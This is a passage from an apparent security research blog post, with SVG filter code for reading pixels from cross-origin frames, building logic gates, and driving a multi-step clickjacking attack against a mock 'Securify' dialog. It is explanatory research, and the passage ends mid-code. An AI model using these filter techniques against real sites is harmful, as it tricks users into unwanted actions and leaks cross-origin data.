        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>
<p>Let‚Äôs start off by using two copies of the <code>feTile</code> filter to first crop out the few pixels we‚Äôre interested in and then tile those pixels across the entire image.</p>
<p>The result is that we now have the entire screen filled with the color of the area we are interested in.</p>
<fake-frame>
  <label for="pixread"></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame>
<pre><code><sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>
<p>We can turn this result into a binary on/off value by using <code>feComposite</code>‚Äôs arithmetic the same way as in the last section, but with a way larger <code>k2</code> value. This makes it so that the output image is either completely black or completely white.</p>
<fake-frame>
  <label for="pixread"></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame>
<pre><code><sx-t>&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0
          0 0 0 0 0
          0 0 0 0 0
          0 0 1 0 0&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>mask</sx-v> <sx-t>/&gt;
&lt;feGaussianBlur</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v>
                <sx-r>stdDeviation</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>mask</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>
<p>And just as before, this can be used as a mask. We once again convert it into an alpha matte, but this time apply it to the blur filter.</p>
<p>So that‚Äôs how you can find out whether a pixel is black and use that to toggle a filter!</p>
<fake-frame>
  <label for="pixread"></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame>
<p>Uh oh! It seems that somebody has changed the target to have a pride-themed button instead!</p>
<p>How can we adapt this technique to work with arbitrary colors and textures?</p>
<fake-frame>
  <label for="pixread"></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame>
<pre><code><sx-c>&lt;!-- crop to first stripe of the flag --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;22&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;22&#34;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&#34;col&#34;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- generate a color to diff against --&gt;</sx-c>
<sx-t>&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>&#34;#5BCFFA&#34;</sx-v>
         <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&#34;blue&#34;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>&#34;difference&#34;</sx-v>
         <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>&#34;col&#34;</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>&#34;blue&#34;</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- k4 is for more lenient threshold --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v>
             <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-5</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- do the masking and blur stuff... --&gt;</sx-c>
...
</code></pre>
<p>The solution is pretty simple - we can simply use <code>feBlend</code>‚Äôs difference combined with a <code>feColorMatrix</code> to join the color channels to turn the image into a similar black/white matte as before. For textures we can use <code>feImage</code>, and for non-exact colors we can use a bit of <code>feComposite</code>‚Äôs arithmetic to make the matching threshold more lenient.</p>
<p>And that‚Äôs it, a simple example of how we can read a pixel value and use it to toggle a filter.</p>
<!--On a higher level, what we can do is detect the color of arbitrary pixels and render our own fake ui accordingly.-->
<h3 id="logic-gates">Logic gates</h3>
<!-- example: a button has hover effects, pressing it opens a modal that dims the background, the modal requires us to ... -->
<p>But here‚Äôs the part where it gets fun! We can repeat the pixel-reading process to read out multiple pixels, and then run logic on them to program an attack.</p>
<p>By using <code>feBlend</code> and <code>feComposite</code>, we can recreate all logic gates and make SVG filters <a href="https://en.wikipedia.org/wiki/Functional_completeness">functionally complete</a>. This means that we can program anything we want, as long as it is not timing-based<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup> and doesn‚Äôt take up too many resources<sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup>.</p>
<div id="logic-gates-outer">
<div id="logic-gates-box">
  <p><label>Input A</label>
    <label>Input B</label>
  </p>
  <p>Input: <logic-gate></logic-gate></p>
  <p>¬†¬†NOT: <logic-gate></logic-gate>
    </p>
  <p>¬†¬†AND: <logic-gate></logic-gate>
    </p>
  <p>¬†¬†¬†OR: <logic-gate></logic-gate>
    </p>
  <p>¬†¬†XOR: <logic-gate></logic-gate>
    </p>
  <p>¬†NAND: <logic-gate></logic-gate>
    </p>
  <p>¬†¬†NOR: <logic-gate></logic-gate>
    </p>
  <p>¬†XNOR: <logic-gate></logic-gate>
    </p>
</div>
</div>


<p>These logic gates are what modern computers are made of. You could build a computer within an SVG filter if you wanted to. In fact, here‚Äôs a basic calculator I made:</p>
<div id="calculator-outer">
  <div id="calculator-box">
    <p>SVG Adder</p>
    <div>
      <div>
        <p>:3</p>
        <p><span>1</span><span>2</span><span>4</span><span>8</span><span>16</span><span>32</span><span>64</span><span>128</span>
      </p></div>
      <div>
        <p><span>In A</span>
          <span>In B</span>
          <span>Carry</span>
          <span>Out</span>
        </p>
        <div>
          <div id="calculator-adder">
            <!-- Note: The reason I'm putting multiple divs here instead of a single filter is that otherwise it breaks in firefox. -->
            <div><div><div><div><div><div><div><div>
              
              
              
              
              
              
              
              
            </div></div></div></div></div></div></div></div>
          </div>
          
          
          
        </div>
      </div>
    </div>
  </div>
</div>


<p>This is a <a href="https://en.wikipedia.org/wiki/Adder_%28electronics%29#Full_adder">full adder</a> circuit. This filter implements the logic gates <math><mi>S</mi><mo>=</mo><mi>A</mi><mo>‚äï</mo><mi>B</mi><mo>‚äï</mo><msub><mi>C</mi><mi>in</mi></msub></math> for the output and <math><msub><mi>C</mi><mi>out</mi></msub><mo>=</mo><mrow><mo>(</mo><mi>A</mi><mo>‚àß</mo><mi>B</mi><mo>)</mo></mrow><mo>‚à®</mo><mrow><mo>(</mo><msub><mi>C</mi><mi>in</mi></msub><mo>‚àß</mo><mrow><mo>(</mo><mi>A</mi><mo>‚äï</mo><mi>B</mi><mo>)</mo></mrow><mo>)</mo></mrow></math> for the carry bit using the logic gates described above. There are more efficient ways to implement an adder in SVG filters, but this is meant to serve as proof of the ability to implement arbitrary logic circuits.</p>
<pre><code><sx-c>&lt;!-- util --&gt;</sx-c>
<sx-t>&lt;feOffset</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>&#34;SourceGraphic&#34;</sx-v> <sx-r>dx</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>dy</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;16px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;16px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>a</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;48px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;16px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>b</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;72px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;16px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>c</sx-v> <sx-t>/&gt;
&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- A ‚äï B --&gt;</sx-c>
<sx-t>&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>a</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>b</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>ab</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- [A ‚äï B] ‚äï C --&gt;</sx-c>
<sx-t>&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>c</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Save result to &#39;out&#39; --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;96px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;32&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;32&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- C ‚àß [A ‚äï B] --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>ab</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>c</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>abc</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- (A ‚àß B) --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>a</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>b</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- [A ‚àß B] ‚à® [C ‚àß (A ‚äï B)] --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>abc</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Save result to &#39;carry&#39; --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;64px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;32px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;32&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;32&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>carry</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Combine results --&gt;</sx-c>
<sx-t>&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>done</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Shift first row to last --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;32&#34;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>lastrow</sx-v> <sx-t>/&gt;
&lt;feOffset</sx-t> <sx-r>dx</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>dy</sx-r><sx-t>=</sx-t><sx-v>&#34;-32&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>done</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>lastrow</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Crop to output --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>
<p>Anyways, for an attacker, what all of this means is that you can make a multi-step clickjacking attack with lots of conditions and interactivity. And you can run logic on data from cross-origin frames.</p>
<fake-frame>
  <p>Securify</p>
  <p>Welcome to this secure application!</p>
  <label><g-button primary="">Hack me</g-button></label>
  <div><div>
    <p>Hack confirmation</p>
    <p>Are you sure you&#39;d like to get hacked?</p>
    <p><label>I am 100% sure</label>
    <label for="hackmecheck1"><g-button>No</g-button></label>
    <label><g-button primary="">Yes</g-button></label>
    <span>‚åõ</span>
  </p></div></div>
  <p><label for="hackmeyes1">You have been hacked!</label></p>
</fake-frame>

<p>This is an example target where we want to trick the user into marking themselves as hacked, which requires a few steps:</p>
<ul>
<li>Clicking a button to open a dialog</li>
<li>Waiting for the dialog to load</li>
<li>Clicking a checkbox within the dialog</li>
<li>Clicking another button in the dialog</li>
<li>Checking for the red text that appeared</li>
</ul>
<fake-frame>
    <p>Securify</p>
  <p>Welcome to this secure application!</p>
  <label><g-button primary="">Hack me</g-button></label>
  <div><div>
    <p>Hack confirmation</p>
    <p>Are you sure you&#39;d like to get hacked?</p>
    <p><label>I am 100% sure</label>
    <label for="hackmecheck3"><g-button>No</g-button></label>
    <label><a href="https://soundcloud.com/beansclub/allicandoiscry" target="_blank"><g-button primary="">Yes</g-button></a></label>
    <span>‚åõ</span>
  </p></div></div>
  <p><label for="hackmeyes3">You have been hacked!</label></p>
  <div id="tradjack-attack">
  <p>Win free iPod by following the steps below.</p>
  <p>1. Click here</p>
  <p>2. Wait 3 seconds</p>
  <p>3. Click</p>
  <p>4. Click here</p>
  </div>
</fake-frame>

<p>A traditional clickjacking attack against this target would be difficult to pull off. You‚Äôd need to have the user click on multiple buttons in a row with no feedback in the UI.</p>
<p>There are some tricks you could do to make a traditional attack more convincing than what you see above, but it‚Äôs still gonna look sketch af. And the moment you throw something like a text input into the mix, it‚Äôs just not gonna work.</p>
<p>Anyways, let‚Äôs build out a logic tree for a filter-based attack:</p>
<ul>
<li>Is the dialog open?
<ul>
<li><em>(No)</em> Is the red text present?
<ul>
<li><em>(No)</em> Make the user press the button</li>
<li><em>(Yes)</em> Show the end screen</li>
</ul>
</li>
<li><em>(Yes)</em> Is the dialog loaded?
<ul>
<li><em>(No)</em> Show loading screen</li>
<li><em>(Yes)</em> Is the checkbox checked?
<ul>
<li><em>(No)</em> Make the user check the checkbox</li>
<li><em>(Yes)</em> Make the user click the button</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Which can be expressed in logic gates<sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup> as:</p>
<ul>
<li>Inputs
<ul>
<li><strong>D</strong> (dialog visible) = check for background dim</li>
<li><strong>L</strong> (dialog loaded) = check for the button in dialog</li>
<li><strong>C</strong> (checkbox checked) = check whether the button is blue or grey</li>
<li><strong>R</strong> (red text visible) = <code>feMorphology</code> and check for red pixels</li>
</ul>
</li>
<li>Outputs
<ul>
<li>(¬¨<strong>D</strong>) ‚àß (¬¨<strong>R</strong>) =&gt; button1.png</li>
<li><strong>D</strong> ‚àß (¬¨<strong>L</strong>) =&gt; loading.png</li>
<li><strong>D</strong> ‚àß <strong>L</strong> ‚àß (¬¨<strong>C</strong>) =&gt; checkbox.png</li>
<li><strong>D</strong> ‚àß <strong>L</strong> ‚àß <strong>C</strong> =&gt; button2.png</li>
<li>(¬¨<strong>D</strong>) ‚àß <strong>R</strong> =&gt; end.png</li>
</ul>
</li>
</ul>
<p>And this is how we would implement it in SVG:</p>
<pre><code><sx-c>&lt;!-- util --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;14px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;4px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>debugEnabled</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- attack imgs --&gt;</sx-c>
<sx-t>&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&#34;data:...&#34;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>button1.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&#34;data:...&#34;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>loading.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&#34;data:...&#34;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>checkbox.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&#34;data:...&#34;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>button2.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&#34;data:...&#34;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>end.png</sx-v><sx-t>&gt;&lt;/feImage&gt;</sx-t>
<sx-c>&lt;!-- D (dialog visible) --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;4px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;4px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>D</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- L (dialog loaded) --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;313px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;141px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&#34;dialogBtn&#34;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>L</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- C (checkbox checked) --&gt;</sx-c>
<sx-t>&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#0B57D0</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>dialogBtn</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>4</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
